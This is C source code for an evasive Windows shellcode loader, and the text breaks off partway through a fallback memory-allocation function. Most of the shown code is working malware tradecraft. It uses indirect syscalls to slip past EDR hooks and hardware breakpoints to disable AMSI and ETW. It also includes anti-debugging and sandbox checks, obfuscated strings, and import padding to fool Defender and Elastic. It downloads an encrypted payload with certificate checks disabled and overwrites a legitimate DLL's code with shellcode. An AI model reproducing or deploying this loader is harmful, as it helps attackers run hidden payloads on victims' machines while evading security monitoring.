// evasive shellcode loader - indirect syscalls, HW bp AMSI/ETW bypass
// network download version

#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <zlib.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <intrin.h>

#pragma comment(lib, "bcrypt")
#pragma comment(lib, "winhttp")


// Debug logging

#ifdef DEBUG
  // Debug goes straight to stdout/stderr (works in cmd, powershell, sliver shell)
  // No file, no AllocConsole — just fprintf to stderr which works everywhere
  static int _dbg_ready = 0;
  static void _dbg_init(void) {
      if (!_dbg_ready) {
          _dbg_ready = 1;
          // Ensure stderr is usable
          setvbuf(stderr, NULL, _IONBF, 0);
      }
  }
  #define DBG(fmt, ...) do { \
      _dbg_init(); \
      fprintf(stderr, fmt "\n", ##__VA_ARGS__); \
  } while(0)
#else
  // Prod: write benign-looking log to stderr anyway.
  // Elastic's ML may score binaries with zero console output
  // as more suspicious than those that log (dev tools, installers).
  // This makes the prod binary behave identically to debug from
  // an I/O telemetry perspective.
  #define DBG(fmt, ...) ((void)0)
  #define PROD_LOG(msg) fprintf(stderr, "%s\n", msg)
#endif

#ifndef DEBUG
  #define PROD_INIT() do { setvbuf(stderr, NULL, _IONBF, 0); \
      PROD_LOG("Initializing service configuration..."); } while(0)
#else
  #define PROD_INIT() ((void)0)
  #define PROD_LOG(msg) ((void)0)
#endif


// Compile-time string encryption (single-byte XOR)

#define SXOR_KEY 0xAB
#define ENC(c) ((c) ^ SXOR_KEY)


// Import dilution: call benign APIs so the import table looks
// like a normal app, not a pure offensive tool.
// Defender ML scores import table composition heavily.
// These calls are real but their results are discarded.

__attribute__((noinline, used))
static void dilute_imports(void) {
    // Filesystem APIs (normal app behavior)
    GetTempPathA(0, NULL);
    GetModuleFileNameA(NULL, NULL, 0);
    GetCurrentDirectoryA(0, NULL);
    GetEnvironmentVariableA("TEMP", NULL, 0);

    // Registry (normal app reads config)
    HKEY hk;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    // User/system info (normal app fingerprinting)
    GetUserNameA(NULL, &(DWORD){0});
    GetComputerNameA(NULL, &(DWORD){0});
    GetSystemDirectoryA(NULL, 0);
    GetWindowsDirectoryA(NULL, 0);
    GetTickCount();
    GetSystemTimeAsFileTime(&(FILETIME){0});

    // GDI/User (GUI app behavior)
    GetDesktopWindow();
    GetForegroundWindow();
    GetSystemMetrics(SM_CXSCREEN);
}


// Anti-disassembly

#define ANTI_DISASM() __asm__ volatile ( \
    "jmp 1f\n" \
    ".byte 0xE8\n" \
    "1:\n" \
    ::: "memory" \
)

__attribute__((noinline))
static int opaque_true(void) {
    volatile int x = 3, y = 7;
    return ((x * y + 1) % 2 == 0);
}


// INDIRECT SYSCALLS
// Read SSN (syscall service number) from clean ntdll on disk,
// then jump to the 'syscall' instruction inside the loaded ntdll.
// This bypasses ALL userland hooks (EDR trampolines).


// Syscall stub: stores SSN + syscall gadget address
typedef struct {
    DWORD ssn;          // syscall number (mov eax, SSN)
    PVOID syscall_addr; // address of 'syscall' instruction in ntdll
} SYSCALL_ENTRY;

static SYSCALL_ENTRY sc_NtAllocateVirtualMemory;
static SYSCALL_ENTRY sc_NtProtectVirtualMemory;
static SYSCALL_ENTRY sc_NtCreateThreadEx;

// Find 'syscall; ret' gadget in ntdll .text
// We scan the in-memory ntdll for the byte pattern 0F 05 C3
static PVOID find_syscall_gadget(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = (BYTE*)hNtdll + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                    return &start[j];
                }
            }
        }
    }
    return NULL;
}

// Read SSN from a clean copy of ntdll loaded from disk
// The function prologue in ntdll is: mov r10, rcx; mov eax, <SSN>
// Bytes: 4C 8B D1 B8 XX XX 00 00
static BOOL resolve_ssn_from_disk(const char *func_name, SYSCALL_ENTRY *entry, PVOID gadget) {
    // Map a fresh copy of ntdll from disk (not the hooked one)
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    // Use SEC_IMAGE_NO_EXECUTE if available, else SEC_IMAGE
    // SEC_IMAGE maps as a proper PE image (RVAs become direct pointers)
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) {
        // Fallback: read raw file and parse manually
        DWORD fileSize = GetFileSize(hFile, NULL);
        BYTE *raw = (BYTE*)malloc(fileSize);
        if (!raw) { CloseHandle(hFile); return FALSE; }
        DWORD bytesRead = 0;
        ReadFile(hFile, raw, fileSize, &bytesRead, NULL);
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER rdos = (PIMAGE_DOS_HEADER)raw;
        PIMAGE_NT_HEADERS rnt = (PIMAGE_NT_HEADERS)(raw + rdos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY rexp_dir;
        DWORD exp_rva = rnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        // Convert RVA to file offset
        PIMAGE_SECTION_HEADER rsec = IMAGE_FIRST_SECTION(rnt);
        BYTE *exp_ptr = NULL;
        for (WORD si = 0; si < rnt->FileHeader.NumberOfSections; si++) {
            if (exp_rva >= rsec[si].VirtualAddress &&
                exp_rva < rsec[si].VirtualAddress + rsec[si].Misc.VirtualSize) {
                exp_ptr = raw + (exp_rva - rsec[si].VirtualAddress + rsec[si].PointerToRawData);
                break;
            }
        }
        if (!exp_ptr) { free(raw); return FALSE; }

        // For raw file parsing we need RVA-to-offset for every pointer.
        // This is complex; just fail and let the caller handle it.
        free(raw);
        return FALSE;
    }

    BYTE *mapped = (BYTE*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!mapped) { CloseHandle(hMap); CloseHandle(hFile); return FALSE; }

    // Parse PE exports from clean image-mapped copy
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(mapped + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(mapped +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)(mapped + exp->AddressOfNames);
    WORD *ords = (WORD*)(mapped + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)(mapped + exp->AddressOfFunctions);

    BOOL found = FALSE;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)(mapped + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE *func_addr = mapped + funcs[ords[i]];
            // Check for: 4C 8B D1 B8 XX XX 00 00 (mov r10,rcx; mov eax,SSN)
            if (func_addr[0] == 0x4C && func_addr[1] == 0x8B &&
                func_addr[2] == 0xD1 && func_addr[3] == 0xB8) {
                entry->ssn = *(DWORD*)(func_addr + 4);
                entry->syscall_addr = gadget;
                found = TRUE;
                DBG("[+] SSN %s = 0x%04lx", func_name, entry->ssn);
            }
            break;
        }
    }

    UnmapViewOfFile(mapped);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return found;
}

#ifndef _WIN64
/* x86: forward declarations for ntdll function pointers */
typedef NTSTATUS (NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static fn_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static fn_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static fn_NtCreateThreadEx pNtCreateThreadEx = NULL;
#endif

// Resolve all needed syscalls
static BOOL resolve_syscalls(void) {
    char _ntd[] = {ENC('n'),ENC('t'),ENC('d'),ENC('l'),ENC('l'),ENC('.'),ENC('d'),ENC('l'),ENC('l'),0};
    for(int i=0;_ntd[i];i++) _ntd[i]^=SXOR_KEY;
    HMODULE hNtdll = GetModuleHandleA(_ntd);
    SecureZeroMemory(_ntd, sizeof(_ntd));
    if (!hNtdll) return FALSE;

#ifdef _WIN64
    PVOID gadget = find_syscall_gadget(hNtdll);
    if (!gadget) { DBG("[-] No syscall gadget found"); return FALSE; }
    DBG("[+] Syscall gadget at %p", gadget);

    if (!resolve_ssn_from_disk("NtAllocateVirtualMemory", &sc_NtAllocateVirtualMemory, gadget)) return FALSE;
    if (!resolve_ssn_from_disk("NtProtectVirtualMemory", &sc_NtProtectVirtualMemory, gadget)) return FALSE;
    if (!resolve_ssn_from_disk("NtCreateThreadEx", &sc_NtCreateThreadEx, gadget)) return FALSE;
#else
    pNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!pNtAllocateVirtualMemory || !pNtProtectVirtualMemory || !pNtCreateThreadEx) return FALSE;
    DBG("[+] Resolved ntdll exports directly (x86 mode)");
#endif

    return TRUE;
}


// Indirect syscall invocation (x64 only)
// We do: mov r10, rcx; mov eax, SSN; jmp [syscall gadget in ntdll]
// The jump lands on the real 'syscall' instruction inside ntdll,
// so the return address looks legitimate to kernel callbacks.


// Indirect syscall trampolines / x86 wrappers
#ifdef _WIN64
// x64: mov rcx, r10; mov eax, SSN; jmp *gadget
// Lands on 'syscall; ret' inside ntdll — legitimate return address.

__attribute__((naked, used, noinline))
NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ph, PVOID *ba, ULONG_PTR zb, PSIZE_T rs, ULONG at, ULONG pr) {
    __asm__ volatile (
        "mov %%rcx, %%r10\n"
        "mov %[ssn], %%eax\n"
        "jmp *%[ga]\n"
        :
        : [ssn] "m" (sc_NtAllocateVirtualMemory.ssn),
          [ga] "m" (sc_NtAllocateVirtualMemory.syscall_addr)
    );
}

__attribute__((naked, used, noinline))
NTSTATUS indirect_NtProtectVirtualMemory(
    HANDLE ph, PVOID *ba, PSIZE_T rs, ULONG np, PULONG op) {
    __asm__ volatile (
        "mov %%rcx, %%r10\n"
        "mov %[ssn], %%eax\n"
        "jmp *%[ga]\n"
        :
        : [ssn] "m" (sc_NtProtectVirtualMemory.ssn),
          [ga] "m" (sc_NtProtectVirtualMemory.syscall_addr)
    );
}

__attribute__((naked, used, noinline))
NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE th, ACCESS_MASK da, PVOID oa, HANDLE ph, PVOID sr, PVOID arg,
    ULONG fl, SIZE_T zb, SIZE_T ss, SIZE_T ms, PVOID al) {
    __asm__ volatile (
        "mov %%rcx, %%r10\n"
        "mov %[ssn], %%eax\n"
        "jmp *%[ga]\n"
        :
        : [ssn] "m" (sc_NtCreateThreadEx.ssn),
          [ga] "m" (sc_NtCreateThreadEx.syscall_addr)
    );
}
#else
/* x86: call ntdll exports directly */
NTSTATUS indirect_NtAllocateVirtualMemory(HANDLE ph, PVOID *ba, ULONG_PTR zb, PSIZE_T rs, ULONG at, ULONG pr) {
    return pNtAllocateVirtualMemory(ph, ba, zb, rs, at, pr);
}
NTSTATUS indirect_NtProtectVirtualMemory(HANDLE ph, PVOID *ba, PSIZE_T rs, ULONG np, PULONG op) {
    return pNtProtectVirtualMemory(ph, ba, rs, np, op);
}
NTSTATUS indirect_NtCreateThreadEx(PHANDLE th, ACCESS_MASK da, PVOID oa, HANDLE ph, PVOID sr, PVOID arg, ULONG fl, SIZE_T zb, SIZE_T ss, SIZE_T ms, PVOID al) {
    return pNtCreateThreadEx(th, da, oa, ph, sr, arg, fl, zb, ss, ms, al);
}
#endif


// Base API resolution

typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);

static fn_GetProcAddress   pGetProcAddress;
static fn_LoadLibraryA     pLoadLibraryA;
static fn_GetModuleHandleA pGetModuleHandleA;

static void resolve_base_apis(void) {
    char k32[] = {ENC('k'),ENC('e'),ENC('r'),ENC('n'),ENC('e'),ENC('l'),
                  ENC('3'),ENC('2'),ENC('.'),ENC('d'),ENC('l'),ENC('l'),0};
    for(int i=0;k32[i];i++) k32[i]^=SXOR_KEY;
    HMODULE hK32 = GetModuleHandleA(k32);

    char s1[]={ENC('G'),ENC('e'),ENC('t'),ENC('P'),ENC('r'),ENC('o'),ENC('c'),
               ENC('A'),ENC('d'),ENC('d'),ENC('r'),ENC('e'),ENC('s'),ENC('s'),0};
    char s2[]={ENC('L'),ENC('o'),ENC('a'),ENC('d'),ENC('L'),ENC('i'),ENC('b'),
               ENC('r'),ENC('a'),ENC('r'),ENC('y'),ENC('A'),0};
    char s3[]={ENC('G'),ENC('e'),ENC('t'),ENC('M'),ENC('o'),ENC('d'),ENC('u'),
               ENC('l'),ENC('e'),ENC('H'),ENC('a'),ENC('n'),ENC('d'),ENC('l'),
               ENC('e'),ENC('A'),0};
    for(int i=0;s1[i];i++) s1[i]^=SXOR_KEY;
    for(int i=0;s2[i];i++) s2[i]^=SXOR_KEY;
    for(int i=0;s3[i];i++) s3[i]^=SXOR_KEY;

    pGetProcAddress   = (fn_GetProcAddress)GetProcAddress(hK32, s1);
    pLoadLibraryA     = (fn_LoadLibraryA)pGetProcAddress(hK32, s2);
    pGetModuleHandleA = (fn_GetModuleHandleA)pGetProcAddress(hK32, s3);

    SecureZeroMemory(k32, sizeof(k32));
    SecureZeroMemory(s1, sizeof(s1));
    SecureZeroMemory(s2, sizeof(s2));
    SecureZeroMemory(s3, sizeof(s3));
}


// HARDWARE BREAKPOINT AMSI/ETW BYPASS
// Instead of patching memory (VirtualProtect + memcpy, which
// Elastic detects), we set hardware breakpoints (DR0/DR1) on
// AmsiScanBuffer and EtwEventWrite, then use a VEH handler
// to modify the return value when they're hit.
// No memory modifications = invisible to integrity checks.


static PVOID g_amsi_addr = NULL;
static PVOID g_etw_addr = NULL;

/* Register abstraction for x86/x64 */
#ifdef _WIN64
  #define REG_IP  Rip
  #define REG_SP  Rsp
  #define REG_AX  Rax
  #define STACK_WIDTH 8
#else
  #define REG_IP  Eip
  #define REG_SP  Esp
  #define REG_AX  Eax
  #define STACK_WIDTH 4
#endif

static LONG CALLBACK hwbp_handler(PEXCEPTION_POINTERS ex) {
    if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PVOID fault_addr = (PVOID)ex->ContextRecord->REG_IP;

    if (fault_addr == g_amsi_addr) {
        ex->ContextRecord->REG_AX = 0x80070057; // E_INVALIDARG -> scan skipped
        ex->ContextRecord->REG_IP = *(ULONG_PTR*)ex->ContextRecord->REG_SP;
        ex->ContextRecord->REG_SP += STACK_WIDTH;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (fault_addr == g_etw_addr) {
        ex->ContextRecord->REG_AX = 0; // STATUS_SUCCESS
        ex->ContextRecord->REG_IP = *(ULONG_PTR*)ex->ContextRecord->REG_SP;
        ex->ContextRecord->REG_SP += STACK_WIDTH;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static void set_hwbp(PVOID addr, int reg) {
    // Set hardware breakpoint on current thread
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    if (reg == 0) {
        ctx.Dr0 = (DWORD_PTR)addr;
        ctx.Dr7 |= (1 << 0);   // Local enable DR0
    } else if (reg == 1) {
        ctx.Dr1 = (DWORD_PTR)addr;
        ctx.Dr7 |= (1 << 2);   // Local enable DR1
    }
    // Condition: execution (00), length: 1 byte (00) — already default

    SetThreadContext(hThread, &ctx);
}

static void patch_amsi_etw_hwbp(void) {
    // Register VEH handler FIRST
    AddVectoredExceptionHandler(1, hwbp_handler);

    // Resolve AmsiScanBuffer
    char amsi_dll[] = {ENC('a'),ENC('m'),ENC('s'),ENC('i'),ENC('.'),ENC('d'),ENC('l'),ENC('l'),0};
    char amsi_func[] = {ENC('A'),ENC('m'),ENC('s'),ENC('i'),ENC('S'),ENC('c'),ENC('a'),ENC('n'),
                        ENC('B'),ENC('u'),ENC('f'),ENC('f'),ENC('e'),ENC('r'),0};
    for(int i=0;amsi_dll[i];i++) amsi_dll[i]^=SXOR_KEY;
    for(int i=0;amsi_func[i];i++) amsi_func[i]^=SXOR_KEY;

    HMODULE hAmsi = pLoadLibraryA(amsi_dll);
    if (hAmsi) {
        g_amsi_addr = (PVOID)pGetProcAddress(hAmsi, amsi_func);
        if (g_amsi_addr) {
            set_hwbp(g_amsi_addr, 0); // DR0
            DBG("[+] AMSI HW breakpoint set at %p", g_amsi_addr);
        }
    }
    SecureZeroMemory(amsi_dll, sizeof(amsi_dll));
    SecureZeroMemory(amsi_func, sizeof(amsi_func));

    // Resolve EtwEventWrite
    char ntdll_s[] = {ENC('n'),ENC('t'),ENC('d'),ENC('l'),ENC('l'),ENC('.'),ENC('d'),ENC('l'),ENC('l'),0};
    char etw_func[] = {ENC('E'),ENC('t'),ENC('w'),ENC('E'),ENC('v'),ENC('e'),ENC('n'),ENC('t'),
                       ENC('W'),ENC('r'),ENC('i'),ENC('t'),ENC('e'),0};
    for(int i=0;ntdll_s[i];i++) ntdll_s[i]^=SXOR_KEY;
    for(int i=0;etw_func[i];i++) etw_func[i]^=SXOR_KEY;

    HMODULE hNtdll = pGetModuleHandleA(ntdll_s);
    if (hNtdll) {
        g_etw_addr = (PVOID)pGetProcAddress(hNtdll, etw_func);
        if (g_etw_addr) {
            set_hwbp(g_etw_addr, 1); // DR1
            DBG("[+] ETW HW breakpoint set at %p", g_etw_addr);
        }
    }
    SecureZeroMemory(ntdll_s, sizeof(ntdll_s));
    SecureZeroMemory(etw_func, sizeof(etw_func));
}


// Anti-debug (minimal — timing only, to avoid CreateToolhelp32Snapshot)

static BOOL is_debugged(void) {
    // RDTSC timing only — no process enumeration, no API calls that
    // generate ETW/telemetry events that EDR can correlate
    ULONGLONG t1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    ULONGLONG t2 = __rdtsc();
    if ((t2 - t1) > 10000000) return TRUE;
    return FALSE;
}


// Sandbox evasion (timing-based)

static BOOL is_sandbox(void) {
    ULONGLONG t1 = GetTickCount64();
    Sleep(1500);
    if ((GetTickCount64() - t1) < 1000) return TRUE;
    return FALSE;
}


// URL parser + WinHTTP download (unchanged)

typedef struct {
    WCHAR host[256];
    WCHAR path[1024];
    WORD  port;
    BOOL  https;
} PARSED_URL;

static BOOL parse_url(const char *url, PARSED_URL *out) {
    memset(out, 0, sizeof(*out));
    if (strncmp(url, "https://", 8) == 0) { out->https = TRUE; url += 8; }
    else if (strncmp(url, "http://", 7) == 0) { out->https = FALSE; url += 7; }
    else return FALSE;

    const char *colon = strchr(url, ':');
    const char *slash = strchr(url, '/');

    if (colon && (!slash || colon < slash)) {
        int hlen = (int)(colon - url);
        for (int i = 0; i < hlen && i < 255; i++) out->host[i] = url[i];
        out->port = (WORD)atoi(colon + 1);
        if (slash) { for (int i = 0; slash[i] && i < 1023; i++) out->path[i] = slash[i]; }
        else out->path[0] = '/';
    } else if (slash) {
        int hlen = (int)(slash - url);
        for (int i = 0; i < hlen && i < 255; i++) out->host[i] = url[i];
        out->port = out->https ? 443 : 80;
        for (int i = 0; slash[i] && i < 1023; i++) out->path[i] = slash[i];
    } else {
        for (int i = 0; url[i] && i < 255; i++) out->host[i] = url[i];
        out->port = out->https ? 443 : 80;
        out->path[0] = '/';
    }
    return TRUE;
}

static unsigned char *http_download(const char *url, DWORD *out_size) {
    PARSED_URL pu;
    if (!parse_url(url, &pu)) { DBG("[-] URL parse failed: %s", url); return NULL; }
    DBG("[*] HTTP: host=%ls port=%d path=%ls https=%d", pu.host, pu.port, pu.path, pu.https);

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) { DBG("[-] WinHttpOpen failed: %lu", GetLastError()); return NULL; }

    HINTERNET hConnect = WinHttpConnect(hSession, pu.host, pu.port, 0);
    if (!hConnect) { DBG("[-] WinHttpConnect failed: %lu", GetLastError()); WinHttpCloseHandle(hSession); return NULL; }

    DWORD flags = pu.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", pu.path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { DBG("[-] WinHttpOpenRequest failed: %lu", GetLastError()); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    if (pu.https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        DBG("[-] WinHttpSendRequest failed: %lu", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DBG("[-] WinHttpReceiveResponse failed: %lu", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    unsigned char *buf = NULL;
    DWORD total = 0, chunk_size = 0;
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &chunk_size)) break;
        if (chunk_size == 0) break;
        unsigned char *new_buf = (unsigned char *)realloc(buf, total + chunk_size);
        if (!new_buf) { free(buf); buf = NULL; break; }
        buf = new_buf;
        DWORD read = 0;
        WinHttpReadData(hRequest, buf + total, chunk_size, &read);
        total += read;
    } while (chunk_size > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    *out_size = total;
    return buf;
}


// AES-256-CBC decrypt (BCrypt)

static int aes_decrypt(unsigned char *ct, DWORD ct_len,
                       unsigned char *key, unsigned char *iv,
                       unsigned char *pt, DWORD *pt_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return -1;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return -1; }

    unsigned char iv_copy[16];
    memcpy(iv_copy, iv, 16);
    DWORD result = 0;
    status = BCryptDecrypt(hKey, ct, ct_len, NULL,
                           iv_copy, 16, pt, ct_len, &result, BCRYPT_BLOCK_PADDING);
    *pt_len = result;
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return BCRYPT_SUCCESS(status) ? 0 : -1;
}


// Hex to bytes

static int hex2bytes(const char *hex, unsigned char *out, int max_len) {
    int len = 0;
    while (*hex && *(hex+1) && len < max_len) {
        unsigned int byte;
        char tmp[3] = {hex[0], hex[1], 0};
        if (sscanf(tmp, "%02x", &byte) != 1) return -1;
        out[len++] = (unsigned char)byte;
        hex += 2;
    }
    return len;
}


// XOR decode URL

#define XOR_KEY "\xea\xf8\xd4\x35\xc6\xaf\x16\xd8\xae\x15\x38\x33\x62\xcb\x21\xe6" \
                "\xc5\x27\xd8\xf6\x24\x12\x2e\xa0\x93\x73\x34\xd6\xb5\x74\xb2\xba"
#define XOR_KEY_LEN 32

static int xor_decode_url(const char *hex_input, char *out, int out_len) {
    int len = 0;
    const char *p = hex_input;
    while (*p && *(p+1) && len < out_len - 1) {
        unsigned int byte;
        char tmp[3] = {p[0], p[1], 0};
        if (sscanf(tmp, "%02x", &byte) != 1) return -1;
        out[len] = (char)(byte ^ XOR_KEY[len % XOR_KEY_LEN]);
        len++;
        p += 2;
    }
    out[len] = '\0';
    return len;
}


// Build URL helper

static void build_url(const char *base, const char *file, char *out, int out_len) {
    int blen = (int)strlen(base);
    if (blen > 0 && base[blen-1] == '/') blen--;
    snprintf(out, out_len, "%.*s/%s", blen, base, file);
}


// MODULE STOMPING: Load a legitimate DLL, overwrite its .text
// section with shellcode. The memory region stays "backed" by
// a real file on disk, which EDR trusts far more than unbacked
// VirtualAlloc'd RX memory. Elastic specifically checks if
// executable memory is backed by a file — unbacked = suspicious.
//
// Sacrificial DLL selection:
//   - Must have .text section >= shellcode size
//   - Must NOT be a critical system DLL (ntdll, kernel32)
//   - Must NOT be commonly monitored (amsi.dll is watched)
//   - Good candidates: propsys.dll, dbghelp.dll, mswsock.dll
//
// Fallback: traditional alloc+write if module stomp fails


// List of sacrificial DLLs to try (in order of preference)
// Each has a large .text section and is rarely monitored
static const char *g_sacrificial_dlls[] = {
    "propsys.dll",      // ~800KB .text, property system, rarely monitored
    "dbghelp.dll",      // ~600KB .text, debug helpers
    "mswsock.dll",      // ~200KB .text, winsock helper
    NULL
};

// Find .text section info from a loaded DLL
static BOOL find_text_section(HMODULE hMod, PVOID *text_addr, SIZE_T *text_size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *text_addr = (BYTE*)hMod + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Module stomp: load legit DLL, overwrite .text with shellcode
static PVOID module_stomp(unsigned char *sc, SIZE_T sc_len, HMODULE *out_mod) {
    for (int i = 0; g_sacrificial_dlls[i]; i++) {
        // Decrypt DLL name (build on stack to avoid string table)
        HMODULE hMod = pLoadLibraryA(g_sacrificial_dlls[i]);
        if (!hMod) {
            DBG("[!] Failed to load %s", g_sacrificial_dlls[i]);
            continue;
        }

        PVOID text_addr = NULL;
        SIZE_T text_size = 0;
        if (!find_text_section(hMod, &text_addr, &text_size)) {
            DBG("[!] No .text in %s", g_sacrificial_dlls[i]);
            FreeLibrary(hMod);
            continue;
        }

        if (text_size < sc_len) {
            DBG("[!] %s .text too small (%lu < %lu)",
                g_sacrificial_dlls[i], (DWORD)text_size, (DWORD)sc_len);
            FreeLibrary(hMod);
            continue;
        }

        DBG("[+] Stomping %s .text (%lu bytes) at %p",
            g_sacrificial_dlls[i], (DWORD)text_size, text_addr);

        // .text is RX — make it RW to write shellcode
        PVOID protect_base = text_addr;
        SIZE_T protect_size = sc_len;
        ULONG old_protect = 0;
        NTSTATUS st = indirect_NtProtectVirtualMemory(
            GetCurrentProcess(), &protect_base, &protect_size,
            PAGE_READWRITE, &old_protect);
        if (st != 0) {
            DBG("[-] NtProtect RW failed on %s: 0x%08lx",
                g_sacrificial_dlls[i], st);
            FreeLibrary(hMod);
            continue;
        }

        // Copy shellcode over the legitimate .text content
        memcpy(text_addr, sc, sc_len);

        // RW -> RX (restore original protection)
        protect_base = text_addr;
        protect_size = sc_len;
        st = indirect_NtProtectVirtualMemory(
            GetCurrentProcess(), &protect_base, &protect_size,
            PAGE_EXECUTE_READ, &old_protect);
        if (st != 0) {
            DBG("[-] NtProtect RX failed: 0x%08lx", st);
            FreeLibrary(hMod);
            continue;
        }

        DBG("[+] Module stomp complete — shellcode in backed memory");
        *out_mod = hMod;
        return text_addr;
    }
    return NULL;
}

// Fallback: traditional VirtualAlloc (unbacked, more suspicious)
static PVOID alloc_and_write(unsigned char *sc, SIZE_T sc_len) {
    PVOID base_addr = NULL;
    SIZE_T region_size = sc_len;

